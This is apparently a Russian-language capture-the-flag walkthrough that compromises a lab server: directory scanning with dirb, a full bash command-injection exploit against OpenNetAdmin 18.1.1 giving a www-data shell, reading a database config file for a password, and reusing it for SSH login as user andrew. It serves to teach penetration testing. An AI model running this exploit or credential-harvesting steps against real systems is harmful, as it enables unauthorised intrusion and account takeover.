# 1) Поиск скрытых файлов и каталогов

Используем [dirb](https://github.com/v0re/dirb) для поиска файлов и каталогов на сервере:

`$ dirb http://9215fc5b9c9d.ngrok.io `
Обнаруживаем директорию /ona/,переходим по ней и видем меню OpenNetAdmin.
Изучив главную страницу замечаем сообщение:
```
You are NOT on the latest release version
Your version    = v18.1.1
```
Теперь мы знаем,что на сервере стоит OpenNetAdmin версии 18.1.1.
# 2) Используем уязвимость в OpenNetAdmin
Ищем уязвимости на OpenNetAdmin 18.1.1,находим bash скрипт,который даёт нам RCE:
```
#!/bin/bash
URL="http://9215fc5b9c9d.ngrok.io/ona/"
while true;do
 echo -n "$ "; read cmd
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' 
done
```
Используя RCE полученное ранее узнаём,от какого пользователя мы выполняем команды
```
$ whoami
www-data
```
Данный пользователь не обладает root правами поэтому ищем способ повышенния своих привелегий.

# 3) Ищем дырочки
Кроме нас есть пользователь `Andrew`, в которого очень хотелось бы войти ( ͡• ͜ʖ ͡• )

На гите чекаем [ona](https://github.com/opennetadmin/ona) и находим приколы, а именно как чё устанавливается [ona install.php](https://github.com/opennetadmin/ona/blob/master/install/install.php)

Нас интересует строка
```
$dbconfwrite = @is_writable($onabase.'/www/local/config/') ? 'Yes' : '<font color="red">No</font>';
```
Отсюда делаем вывод, что надо порыться в `/opt/ona/www/local/config` через наш шелл
```
ls -l /opt/ona/www/local/config
```
Видим содержимое:
```
database_settings.inc.php
motd.txt.example
```
Чекаем пхпышечку с помощью `cat`
```
cat /opt/ona/www/local/config/database_settings.inc.php
```
Вывод:
```
$  cat ./local/config/database_settings.inc.php   
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'mH1XDvt7I,&6',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);
```
Вау-вау-вау приколы стоили рофляночки, мы тут видим пароль `mH1XDvt7I,&6`

Первое, что мы пробуем --- войти в нашего Andrew с этим паролем по ssh
```
ssh andrew@9215fc5b9c9d.ngrok.io -p 17408
```
А в поле для пароля пихаем `mH1XDvt7I,&6`, и мы вошли в нашего друга))
